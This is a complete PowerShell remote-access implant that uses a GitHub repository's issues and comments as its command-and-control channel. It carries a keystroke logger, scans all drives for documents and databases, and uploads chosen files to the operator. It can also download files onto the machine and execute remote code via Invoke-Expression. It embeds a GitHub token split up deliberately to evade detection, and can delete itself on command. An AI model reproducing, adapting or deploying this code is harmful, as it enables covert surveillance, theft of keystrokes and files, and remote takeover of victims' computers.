#Import GetAsyncKeyState DLL for the input logger
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@

function Send-Message
{
    #Make sure to change the default values for non-mandatory parameters if the variable name changes in the script
	[CmdletBinding()] Param
    (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)][Alias("id","command","commandType")][int] $commandID,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)][Alias("message","text")][String] $body,
        [Parameter(Mandatory = $False, ValueFromPipeline = $True)][Alias("parameterOne","paramOne")][String] $p1 = "",
        [Parameter(Mandatory = $False, ValueFromPipeline = $True)][Alias("parameterTwo","paramTwo")][String] $p2 = "",
        [Parameter(Mandatory = $False, ValueFromPipeline = $True)][Alias("parameterThree","paramThree")][String] $p3 = "",
        [Parameter(Mandatory = $False, ValueFromPipeline = $True)][Alias("repo","repositoryName")][String] $repository = $repositoryName,
        [Parameter(Mandatory = $False, ValueFromPipeline = $True)][Alias("userName","login","logged")][String] $user = $GitHubUserName,
        [Parameter(Mandatory = $False, ValueFromPipeline = $True)][Alias("issueNum","issNum","iss")][int] $issue = $issueNumber,
        [Parameter(Mandatory = $False, ValueFromPipeline = $True)][Alias("debugMode","mode")][bool] $debugging = $debugMode
    )

    try
    {
        #Default switch encodes the body and doesn't add any additional paramters
        switch ($commandID)
        {
            10 #File upload to GitHub command. Don't encode the body as the file is already encoded.
            {
                $mergedBody = "[" + $commandID + "]:[" + $p1 + "]:" + $body
			    New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body $mergedBody
                break
            }

            default
            {
                Write-Console -Message ("Default switch entered.")
                Write-Console -Message ("body is currently set to " + $body)
                $encodedBody = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($body))
                Write-Console -Message ("encodedBody is currently set to " + $encodedBody)
                $mergedBody = "[" + $commandID + "]:" + $encodedBody
                Write-Console -Message ("Merged body is " + $mergedBody)
                New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body "$mergedBody"
                Start-Sleep -s 3
                break
            }
        }
    }
    catch
    {
        If($debugging)
        {
            Write-Host ("DEBUG: Exception thrown in Send-Message. Error: " + $Error)
        }
		Exit
    }
}

function Write-Console
{
    #Make sure to change the default values for non-mandatory parameters if the variable name changes in the script
	[CmdletBinding()] Param
    (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)][Alias("body","text")][String] $message,
        [Parameter(Mandatory = $False, ValueFromPipeline = $True)][Alias("debugMode","mode")][bool] $debugging = $debugMode
    )

	$timeStamp = Get-Date -Format G
	try
	{
        If($debugging)
        {
            Write-Host ("DEBUG: " + $message)
        }

        $consoleLog = $consoleLog + $timeStamp +  ": " + $message + "`n"
	}
	catch
	{
		If($debugging)
        {
            Write-Host ("DEBUG: Exception thrown in Write-Console. Error: " + $Error)
        }
		Exit
	}
}

function Update-SearcherLog
{
    #Make sure to change the default values for non-mandatory parameters if the variable name changes in the script
	[CmdletBinding()] Param
    (
        [Parameter(Mandatory = $False, ValueFromPipeline = $True)][Alias("issueNum","issNum","iss")][int] $issue = $issueNumber
    )
    
    try 
    {
        #Make sure there is at least one entry in the searcher log even if no files with the below specified criteria are found
        $searcherLog = "BEGIN SEARCHER LOG"

        #Search for files with the below extensions and add them to the searcher log. This will take some time if the drives are slow and/or there's a lot of files.
        $extensions = @("csv","db","dbf","mdb","key","odp","pps","ppt","pptx","ods","xlr","xls","xlsx","xlsm","doc","docx","docm","odt","pdf","tex","wks","wps","wpd","pst","ost")
        $fileList = New-Object System.Collections.Generic.List[System.Object]

        #Get all logical drives
        $drives = (Get-PSDrive | Select-Object -ExpandProperty 'Name' | Select-String -Pattern '^[a-z]$')
        Write-Console -Message ("Enumerated all drives.")

        ForEach($drive in $drives)
        {
            #Turn the drive object into a string, and trim the whitespace
            $drive = ($drive | Out-String).Trim()
            Write-Console -Message ("Searching drive " + $drive + "...")
            $files = Get-ChildItem -Path ($drive + ":\") -Recurse -File -Name
            ForEach($file in $files)
            {
                #Turn the file object into a string, and trim the whitespace
                $file = ($file | Out-String).Trim()

                ForEach($extension in $extensions)
                {
                    If($file -like ("*." + $extension))
                    {
                        $fileList.Add($drive + ":\" + $file)
                        Write-Console -Message ("Added " + $file + " based on match with extension " + $extension + " on drive " + $drive + ".")
                        break
                    }
                }
            }
            Write-Console -Message ("Completed searching drive " + $drive + ".")
        }
        $searcherLog = $searcherLog + ($fileList.ToArray())
        Write-Console -Message ("Searching finished.")
    }
    catch
    {
        Send-Message -CommandID 0 -Body ("Exception thrown trying to get the searcher log. Exiting. Error: " + $Error)
        Write-Console -Message ("Exception thrown trying to get the searcher log. Exiting. Error: " + $Error)
        Exit
    }
}

function Start-LoopMode
{
    #Make sure to change the default values for non-mandatory parameters if the variable name changes in the script
	[CmdletBinding()] Param
    (
        [Parameter(Mandatory = $False, ValueFromPipeline = $True)][Alias("repo","repositoryName")][String] $repository = $repositoryName,
        [Parameter(Mandatory = $False, ValueFromPipeline = $True)][Alias("userName","login","logged")][String] $user = $GitHubUserName,
        [Parameter(Mandatory = $False, ValueFromPipeline = $True)][Alias("issueNum","issNum","iss")][int] $issue = $issueNumber
    )

    #Declare default configuration variables
    $phoneInterval = 60 #Minutes
    $phoneStatic = 10 #Minutes
    $uploadConsole = $True
    $uploadComputerInfo = $False
    $uploadProcInfo = $False
    $uploadInputLog = $True
    $quitNow = $False
    $enableInputLogging = $True
    $enableClipboardActions = $False

    While($True)
    {
        #Post heartbeat message.
        try 
        {
            Write-Console -Message ("Posting heartbeat message...")
            Send-Message -CommandID 6 -Body ("Heartbeat Ok.")
            Write-Console -Message ("Posted.")
        }
        catch 
        {
            Send-Message -CommandID 0 -Body ("Exception thrown trying to post the heartbeat message. Exiting. Error: " + $Error)
            Write-Console -Message ("Exception thrown trying to post the heartbeat message. Exiting. Error: " + $Error)
            Exit
        }

        #Get all the comments for this machine. The default sort has least recent comments first, so we need to reverse that to loop through the most recent comments first
        try
        {
            Write-Console -Message ("Fetching all comments for this machine...")
            $comments = Get-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue
            Write-Console -Message ($comments)
            Write-Console -Message ("Attempting to reverse comments...")
            [array]::Reverse($comments)
            Write-Console -Message ("Done. Checking for configuration command...")
        }
        catch
        {
            Send-Message -CommandID 0 -Body ("Exception thrown trying to fetch comments. Exiting. Error: " + $Error)
            Write-Console -Message ("Exception thrown trying to fetch comments. Exiting. Error: " + $Error)
            Exit
        }

        #Loop through comments to find the most recent configuration command
        $mostRecentConfigurationCommandID = 0
        try 
        {
            ForEach($comment in $comments)
            {
                If($comment.body -like "[1]:*")
                {
                    $mostRecentConfigurationCommandID = $comment.ID
                    Write-Console -Message ("Identified configuration command in comment ID " + $mostRecentConfigurationCommandID + ".")
                    break
                }
            }
        }
        catch 
        {
            Send-Message -CommandID 0 -Body ("Exception thrown trying to identify the most recent configuration command. Exiting. Error: " + $Error)
            Write-Console -Message ("Exception thrown trying to identify the most recent configuration command. Exiting. Error: " + $Error)
            Exit
        }

        #Check if we found the configuration command above. If yes, set values. If not, reset values to defaults.
        try
        {
            If(!($mostRecentConfigurationCommandID -eq 0))
            {
                ForEach($comment in $comments)
                {
                    If($comment.ID -eq $mostRecentConfigurationCommandID)
                    {
                        $configurationString = [System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String(($comment.body).replace("[1]:","")))
                        Write-Console -Message ("Decoded the configuration string. It appears to be " + $configurationString)\
                        
                        #Configuration string is in format 1234567890ABCDEFG, where the first and second five digit numbers are the phone interval and static, all the last seven digits set the boolean values
                        If(!($configurationString).length -eq 17)
                        {
                            Send-Message -CommandID 0 -Body ("Configuration string wasn't the correct length. Setting default values and continuing.")
                            Write-Console -Message ("Configuration string wasn't the correct length. Setting default values and continuing.")
                            $phoneInterval = 60 #Minutes
                            $phoneStatic = 10 #Minutes
                            $uploadConsole = $True
                            $uploadComputerInfo = $False
                            $uploadProcInfo = $False
                            $uploadInputLog = $True
                            $quitNow = $False
                            $enableInputLogging = $True
                            $enableClipboardActions = $False
                            Write-Console -Message ("Defaults set.")
                        }
                        Else
                        {
                            Write-Console -Message ("Configuration string appears to be valid. Setting values accordingly...")

                            $phoneInterval = [int]($configurationString.SubString(0,5))
                            Write-Console -Message ("Phone interval set to " + $phoneInterval + ".")

                            $phoneStatic = [int]($configurationString.SubString(5,5))
                            Write-Console -Message ("Phone static set to " + $phoneStatic + ".")

                            If($configurationString.SubString(10,1) -clike "T") {$uploadConsole = $True} Else {$uploadConsole = $False}
                            Write-Console -Message ("Console upload boolean set to " + $uploadConsole + ".")
                            
                            If($configurationString.SubString(11,1) -clike "T") {$uploadComputerInfo = $True} Else {$uploadComputerInfo = $False}
                            Write-Console -Message ("Computer info upload boolean set to " + $uploadComputerInfo + ".")

                            If($configurationString.SubString(12,1) -clike "T") {$uploadProcInfo = $True} Else {$uploadProcInfo = $False}
                            Write-Console -Message ("Process info upload boolean set to " + $uploadProcInfo + ".")
                            
                            If($configurationString.SubString(13,1) -clike "T") {$uploadInputLog = $True} Else {$uploadInputLog = $False}
                            Write-Console -Message ("Process info upload boolean set to " + $uploadInputLog + ".")

                            If($configurationString.SubString(14,1) -clike "T") {$quitNow = $True} Else {$quitNow = $False}
                            Write-Console -Message ("Fast quit boolean set to " + $quitNow + ".")
                            
                            If($configurationString.SubString(15,1) -clike "T") {$enableInputLogging = $True} Else {$enableInputLogging = $False}
                            Write-Console -Message ("Input logging boolean set to " + $enableInputLogging + ".")
                            
                            If($configurationString.SubString(16,1) -clike "T") {$enableClipboardActions = $True} Else {$enableClipboardActions = $False}
                            Write-Console -Message ("Clipboard actions boolean set to " + $enableClipboardActions + ".")
                            
                            Write-Console -Message ("Configuration loaded OK. Continuing.")
                        }
                    }
                    break
                }
            }
        }
        catch
        {
            Send-Message -CommandID 0 -Body ("Exception thrown trying to set new configuration values. Exiting. Error: " + $Error)
            Write-Console -Message ("Exception thrown trying to set new configuration values. Exiting. Error: " + $Error)
            Exit
        }

        try 
        {
            If($mostRecentConfigurationCommandID -eq 0)
            {
                Write-Console -Message ("No configuration command found. Setting configuration to defaults...")
                $phoneInterval = 60 #Minutes
                $phoneStatic = 10 #Minutes
                $uploadConsole = $True
                $uploadComputerInfo = $False
                $uploadProcInfo = $False
                $uploadInputLog = $True
                $quitNow = $False
                $enableInputLogging = $True
                $enableClipboardActions = $False
                Write-Console -Message ("Defaults set.")
            }
        }
        catch 
        {
            Send-Message -CommandID 0 -Body ("Exception thrown trying to reset configuration values to defaults. Exiting. Error: " + $Error)
            Write-Console -Message ("Exception thrown trying to reset configuration values to defaults. Exiting. Error: " + $Error)
            Exit
        }

        try
        {
            If($uploadComputerInfo)
            {
                Write-Console -Message ("Configuration is set to upload the computer info results. Uploading...")
                Send-Message -CommandID 3 -Body ($compInfo)
                Write-Console -Message ("Computer info results upload complete.")
            }
        }
        catch
        {
            Send-Message -CommandID 0 -Body ("Exception thrown trying to upload the computer info results. Exiting. Error: " + $Error)
            Write-Console -Message ("Exception thrown trying to upload the computer info results. Exiting. Error: " + $Error)
            Exit
        }

        try
        {
            If($uploadProcInfo)
            {
                Write-Console -Message ("Configuration is set to upload the process information. Updating it...")
                $procInfo = (Get-Process).ProcessName
                Write-Console -Message ("Update complete. Uploading...")
                Send-Message -CommandID 4 -Body ($procInfo)
                Write-Console -Message ("Process info upload complete.")
            }
        }
        catch
        {
            Send-Message -CommandID 0 -Body ("Exception thrown trying to upload the process info. Exiting. Error: " + $Error)
            Write-Console -Message ("Exception thrown trying to upload the process info. Exiting. Error: " + $Error)
            Exit
        }

        try
        {
            If($uploadInputLog)
            {
                Write-Console -Message ("Configuration is set to upload the input log. Uploading...")
                Send-Message -CommandID 5 -Body ($inputLog)
                Write-Console -Message ("Input log upload complete. Clearing input log...")
                $inputLog = "?1"
                Write-Console -Message ("Input log cleared.")
            }
        }
        catch
        {
            Send-Message -CommandID 0 -Body ("Exception thrown trying to upload the input log. Exiting. Error: " + $Error)
            Write-Console -Message ("Exception thrown trying to upload the input log. Exiting. Error: " + $Error)
            Exit
        }
        
        #Refresh comments, but don't reverse them. Oldest comments will be processed first.
        try
        {
            $comments = Get-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue
        }
        catch 
        {
            Send-Message -CommandID 0 -Body ("Exception thrown trying to refresh comments. Exiting. Error: " + $Error)
            Write-Console -Message ("Exception thrown trying to refresh comments. Exiting. Error: " + $Error)
            Exit
        }

        #Process all commands.
        try 
        {
            ForEach($comment in $comments)
            {
                If($comment.body -like "[7]")
                {
                    Write-Console -Message ("Searcher log refresh command received. Updating the log...")
                    Update-SearcherLog
                    Write-Console -Message ("Searcher log refreshed. Uploading...")
                    Send-Message -CommandID 8 -Body ($searcherLog)
                    Write-Console -Message ("Uploaded. Deleting searcher log refresh command...")
                    Remove-GitHubComment -OwnerName $user -RepositoryName $repository -CommentID $comment.ID
                    Write-Console -Message ("Comment removed.")
                }

                #Upload file to GitHub
                If($comment.body -like "[9]:*")
                {
                    Write-Console -Message ("File upload command received. Checking if target file exists...")
                    $targetFilePath = ($comment.body).replace("[9]:","")

                    If([System.IO.File]::Exists($targetFilePath))
                    {
                        Write-Console -Message ("Found the target file with path " + $targetFilePath + ". Attempting to upload it...")
                        $fileBytes = [System.Convert]::ToBase64String($(Get-Content -ReadCount 0 -Encoding Byte -Path $targetFilePath))
                        Send-Message -CommandID 10 -Body ($fileBytes) -P1 ($targetFilePath)
                        Write-Console -Message ("Uploaded the file. Attempting to delete the command comment...")
                        Remove-GitHubComment -OwnerName $user -RepositoryName $repository -CommentID $comment.ID
                        Write-Console -Message ("Comment removed.")
                    }
                    ElseIf(!([System.IO.File]::Exists($targetFilePath)))
                    {
                        Remove-GitHubComment -OwnerName $user -RepositoryName $repository -CommentID $comment.ID
                        Send-Message -CommandID 0 -Body ("Unable to find the target file with path " + $targetFilePath + ". Exiting.")
                        Write-Console -Message ("Unable to find the target file with path " + $targetFilePath + ". Exiting.")
                        Exit
                    }
                }

                #Download file from GitHub
                If($comment.body -like "[11]:*")
                {
                    Write-Console -Message ("File download command received. Getting file path...")

                    #Get the path to save the file to
                    If(($comment.body).IndexOf("[",2) -ne 5)
                    {
                        Send-Message -CommandID 0 -Body ("Download file command with comment ID " + $comment.ID + " was formatted incorrectly. Deleting...")
                        Write-Console -Message ("Download file command with comment ID " + $comment.ID + " was formatted incorrectly. Deleting...")
                        Remove-GitHubComment -OwnerName $user -RepositoryName $repository -CommentID $comment.ID
                        Write-Console -Message ("Deleted.")
                    }
                    Else
                    {
                        $savePath = ($comment.body).Substring(6, (($comment.body).IndexOf("]",5) - 6))
                        Write-Console -Message ("File path to save to is " + $savePath + ".")

                        #If a file already exists at the target save path, delete it
                        If([System.IO.File]::Exists($savePath))
                        {
                            Write-Console -Message ("There is already a file in that path. Deleting it...")
                            Remove-Item $savePath
                            Write-Console -Message ("Deleted.")
                        }

                        #Save the file
                        Write-Console -Message ("Writing file to disk...")
                        $fileBinary = ($comment.body).Substring(($comment.body).IndexOf(":",6) + 1, ($comment.body).length - ($comment.body).IndexOf(":",6) - 1)
                        [System.Convert]::FromBase64String($fileBinary) | Set-Content -Path $savePath -Encoding Byte
                        Write-Console -Message ("Wrote file. Deleting the command comment...")
                        Remove-GitHubComment -OwnerName $user -RepositoryName $repository -CommentID $comment.ID
                        Write-Console -Message ("Deleted.")
                    }
                }

                #Execute code (PowerShell only via IEX)
                If($comment.body -like "[12]:*")
                {
                    Write-Console -Message ("Code execution command comment received. Executing...")
                    Invoke-Expression -Command ([System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String(($comment.body).Replace("[12]:",""))))
                    Write-Console -Message ("Code execution complete. Deleting comment...")
                    Remove-GitHubComment -OwnerName $user -RepositoryName $repository -CommentID $comment.ID
                    Write-Console -Message ("Deleted.")
                }

                #Remove self
                If($comment.body -like "[13]")
                {
                    Write-Console -Message ("Remove self command received. Deleting...")
                    Remove-Item ($env:USERPROFILE + "\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1")
                    Write-Console -Message ("Deleted. Uploading console and exiting.")
                    Send-Message -CommandID 2 -Body ($consoleLog)
                    Exit
                }
            }
        }
        catch 
        {
            Send-Message -CommandID 0 -Body ("Exception thrown trying to process commands. Exiting. Error: " + $Error)
            Write-Console -Message ("Exception thrown trying to process commands. Exiting. Error: " + $Error)
            Exit
        }
        
        #Calculate the total waiting interval using the "phoneStatic" variable
        If(($phoneStatic + 5) -gt $phoneInterval)
        {
            Write-Console -Message ("Phone static was too large relative to the phone interval. Setting defaults and continuing.")
            $phoneInterval = 60 #Minutes
            $phoneStatic = 10 #Minutes
        }
        $waitTime = $phoneInterval + (Get-Random -Maximum $phoneStatic -Minimum (0 - $phoneStatic))
        Write-Console -Message ("Wait time was set to " + $waitTime + " minutes.")

        try
        {
            If($uploadConsole)
            {
                Write-Console -Message ("Configuration is set to upload the console log. Uploading...")
                Send-Message -CommandID 2 -Body ($consoleLog)
                Write-Console -Message ("Console log upload complete.")
            }
        }
        catch
        {
            Send-Message -CommandID 0 -Body ("Exception thrown trying to upload the console log. Exiting. Error: " + $Error)
            Write-Console -Message ("Exception thrown trying to upload the console log. Exiting. Error: " + $Error)
            Exit
        }

        #Get setup for input logging
        [bool[]]$writeOK = @($true)
        For($i=0; $i -lt 255; $i++)
        {
            $writeOK += $true
        }

        try 
        {
            $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
            Write-Console -Message ("API loaded OK.")
        }
        catch 
        {
            Send-Message -CommandID 0 -Body ("Exception thrown trying to load API. Exiting. Error: " + $Error)
            Write-Console -Message ("Exception thrown trying to load API. Exiting. Error: " + $Error)
            Exit
        }

        #Waiting loop
        $timer = [Diagnostics.Stopwatch]::StartNew()
        While($timer.Elapsed.TotalMinutes -lt $waitTime)
        {
            #Put a short sleep here to avoid hammering the CPU
            Start-Sleep -Milliseconds 1

            If($enableClipboardActions)
            {
                #Clipboard actions here. Unimplemented until use-case found.
            }

            If($enableInputLogging)
            {
                For($i=0; $i -lt 255; $i++)
                {
                    try 
                    {
                        If(($API::GetAsyncKeyState($i) -gt 30000) -Or ($API::GetAsyncKeyState($i) -lt -30000))
                        {
                            If($writeOK[$i] -And !($i -eq 16) -And !($i -eq 17) -And !($i -eq 18) -And !($i -eq 160) -And !($i -eq 162) -And !($i -eq 164))
                            {
                                #Start the write to the input buffer with the "?" character
                                $inputLog = ($inputLog + "?")
                                
                                #Write the modifier key codes to the input buffer
                                If(($API::GetAsyncKeyState(160) -gt 30000) -Or ($API::GetAsyncKeyState(160) -lt -30000) -Or ($API::GetAsyncKeyState(16) -gt 30000) -Or ($API::GetAsyncKeyState(16) -lt -30000))
                                {
                                    $inputLog = ($inputLog + "S")
                                }
                                If(($API::GetAsyncKeyState(162) -gt 30000) -Or ($API::GetAsyncKeyState(162) -lt -30000) -Or ($API::GetAsyncKeyState(17) -gt 30000) -Or ($API::GetAsyncKeyState(17) -lt -30000))
                                {
                                    $inputLog = ($inputLog + "C")
                                }
                                If(($API::GetAsyncKeyState(164) -gt 30000) -Or ($API::GetAsyncKeyState(164) -lt -30000) -Or ($API::GetAsyncKeyState(18) -gt 30000) -Or ($API::GetAsyncKeyState(18) -lt -30000))
                                {
                                    $inputLog = ($inputLog + "A")
                                }
                                $inputLog = ($inputLog + $i)
                                $writeOK[$i] = $false
                            }
                        }
                        Else
                        {
                            $writeOK[$i] = $true
                        }
                    }
                    catch 
                    {
                        Send-Message -CommandID 0 -Body ("Exception thrown trying to log input. Exiting. Error: " + $Error)
                        Write-Console -Message ("Exception thrown trying to log input. Exiting. Error: " + $Error)
                        Exit
                    }
                }
            }
        }
        $timer.stop()
    }
}

#Command IDs:
    #0 = Exception
    #1 = Configuration
    #2 = Console upload
    #3 = Computer info upload
    #4 = Process Info upload
    #5 = Input log upload
    #6 = Heartbeat post
    #7 = Refresh and upload searcher log
    #8 = Searcher log post
    #9 = Command to upload a file to GitHub
    #10 = File that was uploaded to GitHub per #9
    #11 = File to download from GitHub
    #12 = Code to execute from GitHub comment
    #13 = Remove self and exit

#ENTRY POINT

$debugMode = $True
Write-Console -Message ("Program starting with debug mode set to " + $debugMode + ".")

#Check to see if powershell is already running.  If it is, exit the script. This will prevent the script from rendering powershell unusable on the computer.
Write-Console -Message ("Getting processes...")
$procInfo = (Get-Process).ProcessName
Write-Console -Message ("Done. Checking if PowerShell is already running...")
$numPowerShellProcs = 0
ForEach($proc in $procInfo)
{
    If($proc -clike "powershell")
    {
        $numPowerShellProcs = $numPowerShellProcs + 1
        If($numPowerShellProcs -gt 1)
        {
            Remove-Variable -Name debugMode -Force
            Remove-Variable -Name procInfo -Force
            Remove-Variable -Name proc -Force
            Remove-Variable -Name numPowerShellProcs -Force
            Exit
        }
    }
}
Write-Console -Message ("Done. This is the only instance of PowerShell. Execution continuing.")

#Declare global variables
$consoleLog = ""

$GitHubUserName = ""
$expectedGitHubUserName = "BeinnUais1"
$repositoryName = "ceannard1"
$issueNumber = 0

$searcherLog = ""
$inputLog = "?1"

#Use Get-ComputerInfo to get the allegedly unique ProductID which is used to identify the specific machine during communications with CMDR.
Write-Console -Message ("Getting computer info...")
$compInfo = Get-ComputerInfo
Write-Console -Message ("Done.")

#Confirm that NuGet is installed. If not, install it and confirm installation.
If((Get-PackageProvider).Name -clike 'NuGet')
{
	Write-Console -Message ("NuGet OK.")
}
Else
{
	try
	{
        Write-Console -Message ("NuGet not found. Attempting to install NuGet...")
        Install-PackageProvider -Name NuGet -scope CurrentUser -Force
        Write-Console -Message ("NuGet installation command has finished executing.")

		#Verify that NuGet was installed correctly.
		If((Get-PackageProvider).Name -clike 'NuGet')
		{
            Write-Console -Message ("NuGet installation appears to be successful.")
		}
		Else
		{
            Write-Console -Message ("NuGet installation appears to have failed. Exiting.")
			Exit
		}
	}
	catch
	{
        Write-Console -Message ("NuGet installation threw an exception. Exiting.")
		Exit
	}
}

#Confirm that PowerShellForGitHub is installed. If not, install it and confirm installation.
If((Get-InstalledModule).Name -clike 'PowerShellForGitHub')
{
    Write-Console -Message ("PowerShellForGitHub OK.")
}
Else
{
	try
	{
        Write-Console -Message ("PowerShellForGitHub not found. Attempting to install PowerShellForGitHub...")
        Install-Module -Name PowerShellForGithub -Scope CurrentUser -Force
        Write-Console -Message ("PowerShellForGitHub installation command has finished executing.")

		#Verify that PowerShellForGitHub was installed correctly.
		If((Get-InstalledModule).Name -clike 'PowerShellForGitHub')
		{
            Write-Console -Message ("PowerShellForGitHub installation appears to be successful.")
		}
		Else
		{
            Write-Console -Message ("PowerShellForGitHub installation appears to have failed. Exiting.")
			Exit
		}
	}
	catch
	{
        Write-Console -Message ("PowerShellForGitHub installation threw an exception. Exiting.")
		Exit
	}
}

#We must import PSFG each time we start a new PowerShell session.
try 
{
    Import-Module -Name PowerShellForGitHub
    Write-Console -Message ("PowerShellForGitHub import OK.")
}
catch
{
    Write-Console -Message ("PowerShellForGitHub import threw an exception. Exiting.")
	Exit
}

#Disable telemetry on PSFG.
try 
{
    Set-GitHubConfiguration -DisableTelemetry -SessionOnly
    Write-Console -Message ("Telemetry disabled OK.")
}
catch 
{
    Write-Console -Message ("Disabling telemetry threw an exception. Exiting.")
	Exit
}

#Login to GitHub using our auth token. Make sure to split up the token so GitHub can't detect it and disable it for us.
try 
{
	$token = 'ffbc' + 'f7ac0f2e' + '9b703fcfd17e4f' + 'ab4104269e81ad'
	$secure = ConvertTo-SecureString $token -AsPlainText -Force
	$cred = New-Object System.Management.Automation.PSCredential "USERNAME_IS_IGNORED", $secure
	Set-GitHubAuthentication -Credential $cred
	$GitHubUserName = (Get-GitHubUser -Current).Login
	If($GitHubUserName -clike $expectedGitHubUserName)
	{
        Write-Console -Message ("Logged in succesfully.")
	}
	Else
	{
        Write-Console -Message ("Login failed. Exiting.")
		Exit
	}
}
catch 
{
    Write-Console -Message ("Exception or error thrown while trying to log in to GitHub. Exiting.")
	Exit
}

#Get the issue number this machine will use to communicate. If an issue for this machine does not exist, create one and verify it was created successfully.
try
{
	$issueList = Get-GitHubIssue -OwnerName $GitHubUserName -RepositoryName $repositoryName
	$issueList | ForEach-Object -Process `
	{
		If($_.Title -clike $compInfo.WindowsProductID)
		{
            $issueNumber = $_.number
            Write-Console -Message ("Found the issue number for this machine OK. Issue number is " + $issueNumber)
		}
	}
	#Only executes if the $issueNumber wasn't set above because the ProductID has no associated issue.
	If($issueNumber -clike "0")
	{
        Write-Console -Message ("Unable to find the issue number for this machine. Attempting to create one...")
        New-GitHubIssue -OwnerName $GitHubUserName -RepositoryName $repositoryName -Title $compInfo.WindowsProductID -Body $env:USERNAME
        Write-Console -Message ("Issue creation command executed. Verifying...")
		$issueList = Get-GitHubIssue -OwnerName $GitHubUserName -RepositoryName $repositoryName
		$issueList | ForEach-Object -Process `
		{
			If($_.Title -clike $compInfo.WindowsProductID)
			{
                $issueNumber = $_.number
                Write-Console -Message ("New issue for this machine created OK. Issue number is " + $issueNumber)
			}
		}
		#Confirm that $issueNumber now has the correct issue number that we created above.
		If($issueNumber -clike "0")
		{
            Write-Console -Message ("Issue creation failed. Unable to find an issue associated with this machine.")
			Exit
        }
        
        New-GitHubComment -OwnerName $GitHubUserName -RepositoryName $repositoryName -Issue $issueNumber -Body "Testing123"
	}
}
catch
{
    Write-Console -Message ("Exception thrown trying to identify or create an issue associated with this machine. Exiting. Error: " + $Error)
	Exit
}

#Enter loop mode.
try 
{
    Write-Console -Message ("Startup operations complete. Entering loop mode.")
    Start-LoopMode
}
catch 
{
    Send-Message -CommandID 0 -Body ("Exception thrown trying to enter loop mode. Exiting. Error: " + $Error)
    Write-Console -Message ("Exception thrown trying to enter loop mode. Exiting. Error: " + $Error)
	Exit
}
